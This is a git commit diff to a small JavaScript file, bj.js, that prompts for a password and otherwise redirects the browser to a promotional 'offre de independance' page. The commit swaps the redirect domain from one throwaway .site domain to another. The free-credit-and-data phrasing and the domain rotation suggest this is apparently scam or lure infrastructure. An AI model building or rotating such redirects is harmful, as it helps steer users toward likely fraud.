3b6ce8c8e5b9964d957c2491bcdec60b045317f3
usorondo96 <tooltip72_verbena@icloud.com>
2026-07-30 16:48:30 +0100

    Update bj.js

--- bj.js
+++ bj.js
@@ -5,6 +5,6 @@ password = prompt(
 
 );if (password != '1500 DE CRÉDIT + 10 Go DE DONNÉES') {
 
-    location.href = 'https://www.clickbyitid.site/bj-offre-de-independance';
+    location.href = 'https://www.dogbyitid.site/bj-offre-de-independance';
 
 }
